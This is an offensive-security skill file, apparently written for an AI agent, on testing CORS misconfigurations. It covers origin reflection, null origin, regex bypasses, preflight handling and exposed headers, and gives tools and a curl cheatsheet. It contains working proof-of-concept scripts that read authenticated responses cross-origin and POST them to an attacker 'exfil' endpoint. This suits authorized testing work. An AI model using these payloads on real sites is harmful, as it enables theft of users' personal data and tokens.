---
name: offensive-cors-misconfig
description: "CORS (Cross-Origin Resource Sharing) misconfiguration testing — Access-Control-Allow-Origin reflection, Origin null bypass, wildcard with credentials, regex flaws (subdomain.target.com.attacker.com matching), preflight handling errors, exposed headers leaking sensitive data, and chaining CORS misconfig with CSRF for read-after-write attacks. Use when an API responds to cross-origin requests with credentials, or when a SPA uses XHR / fetch against a cookie-authenticated backend."
---

# CORS Misconfiguration

CORS protects browser clients from reading cross-origin responses. When misconfigured — usually from a regex flaw or `Origin` reflection — it lets an attacker site read responses meant for the user's authenticated session.

## Quick Workflow

1. Discover endpoints that set `Access-Control-Allow-Origin`
2. Test for `Origin` reflection
3. Test if `Access-Control-Allow-Credentials: true` is set with broad origins
4. Test regex flaws (subdomain matching, suffix attacks)
5. Build PoC: attacker page reads sensitive cross-origin response

---

## CORS Refresher

```
Browser at https://attacker.com runs: fetch('https://api.target.com/me', {credentials: 'include'})
1. Browser sends request with Origin: https://attacker.com (and cookie if same-site allowed)
2. Server responds with:
   Access-Control-Allow-Origin: <some origin>
   Access-Control-Allow-Credentials: <true | absent>
3. Browser checks the response headers.
   If ACAO matches the request Origin AND credentials allowed (when needed),
   JavaScript at attacker.com receives the response body.
```

## Test 1: ACAO Reflection

```http
GET /api/me
Origin: https://attacker.com

→ HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://attacker.com
   Access-Control-Allow-Credentials: true
   ...
   {"email":"victim@target.com","ssn":"..."}
```

If the server reflects the request `Origin` as ACAO with credentials, any site can read the authenticated response.

PoC:
```html
<!-- attacker.com -->
<script>
fetch('https://api.target.com/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => fetch('https://attacker.com/exfil', {method:'POST', body: t}));
</script>
```

## Test 2: Origin: null

```http
GET /api/me
Origin: null

→ Access-Control-Allow-Origin: null
   Access-Control-Allow-Credentials: true
```

`null` Origin appears in:
- Local file:// pages
- Sandboxed iframes (`<iframe sandbox>`)
- Some redirects

Attacker hosts a sandboxed-iframe page that sends `Origin: null`:

```html
<!-- attacker.com -->
<iframe sandbox="allow-scripts" srcdoc='
  <script>
    fetch("https://api.target.com/me", {credentials:"include"})
      .then(r => r.text())
      .then(t => parent.postMessage(t, "*"));
  </script>
'></iframe>
<script>
window.addEventListener("message", e => {
  fetch("/exfil", {method:"POST", body: e.data});
});
</script>
```

## Test 3: Wildcard with Credentials

```http
→ Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
```

This is browser-blocked (browsers refuse wildcard ACAO with credentials), so **doesn't actually leak** — but reflects misconfig that may be exploitable on another endpoint without credentials.

If the server emits both, *some* legacy browsers ignore the credentials condition. Worth testing in the engagement target's supported browser matrix.

## Test 4: Regex Flaws

The server validates origins via regex but the regex is loose:

```javascript
// Vulnerable
if (origin.match(/target\.com$/)) acao = origin;
// Bypass: Origin: https://target.com.attacker.com
```

```javascript
// Vulnerable
if (origin.match(/.*target\.com/)) acao = origin;
// Bypass: Origin: https://target.com.attacker.com (or any string ending in target.com)
```

```javascript
// Vulnerable — subdomain matches without verifying scheme
if (origin.endsWith(".target.com")) acao = origin;
// Bypass via XSS on any subdomain (e.g. blog.target.com gets XSS → reads api.target.com)
```

```javascript
// Vulnerable — naive split
if (origin.split('.').slice(-2).join('.') === 'target.com') acao = origin;
// Bypass: Origin: https://attacker.target.com.attacker.com (subdomain of attacker domain)
```

Test variations:
- `https://target.com.attacker.com`
- `https://attacker-target.com`
- `https://targetXcom` (special char interpreted as `.`)
- `https://eviltarget.com`
- `https://example.com.target.com` (multiple subdomains)
- IDN homograph: `https://tаrget.com` (Cyrillic а)

## Test 5: Preflight Handling

OPTIONS requests with crafted headers:

```http
OPTIONS /api/transfer
Origin: https://attacker.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-Custom

→ Access-Control-Allow-Origin: https://attacker.com
   Access-Control-Allow-Methods: POST, GET, PUT, DELETE
   Access-Control-Allow-Headers: X-Custom
```

If preflight permissively allows your origin and methods, the actual cross-origin POST works.

Some servers handle preflight separately from the actual request (different endpoint, different validation) → bypass possible via mismatched permissions.

## Test 6: Exposed Headers

```http
→ Access-Control-Expose-Headers: X-Auth-Token, X-Internal-User-Id
```

Cross-origin JS can read those headers from the response. Sensitive data in these headers becomes readable.

## CORS-Enabled CSRF Read

CORS misconfig + CSRF = read-after-write attack:

1. Cross-origin POST modifies state (CSRF)
2. Cross-origin GET reads the modified state (CORS misconfig)

Without CORS misconfig, a CSRF write can succeed but the attacker doesn't see the response.

## Tooling

```bash
# corsy — CORS misconfig scanner
git clone https://github.com/s0md3v/Corsy
python3 corsy.py -u https://api.target.com/me

# CORScanner
git clone https://github.com/chenjj/CORScanner
python cors_scan.py -u https://target.com -d
```

Burp's Active Scanner also catches the most common patterns.

## Engagement Cheatsheet

```bash
# For each authenticated API endpoint:

# 1. Reflection
curl https://api.target.com/me -H "Origin: https://attacker.com" -I | grep -i access-control

# 2. null
curl https://api.target.com/me -H "Origin: null" -I | grep -i access-control

# 3. Subdomain flaws
for o in "https://attacker-target.com" "https://target.com.attacker.com" "https://eviltarget.com"; do
  curl https://api.target.com/me -H "Origin: $o" -I | grep -i access-control
done

# 4. Preflight
curl -X OPTIONS https://api.target.com/api/transfer \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" -I

# 5. Build PoC HTML; verify in browser with logged-in victim session
```

## Reporting

For each finding:
- The vulnerable endpoint and HTTP method
- The exact `Origin` value that triggered the misconfig
- The `Access-Control-Allow-Origin` and `-Credentials` returned
- A working PoC (HTML) demonstrating cross-origin read
- Specific data exposed (PII, tokens, private content)

---

## Key References

- OWASP HTML5 Security Cheat Sheet — CORS
- "Exploiting CORS Misconfigurations" — PortSwigger
- W3C CORS spec
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/cors.md
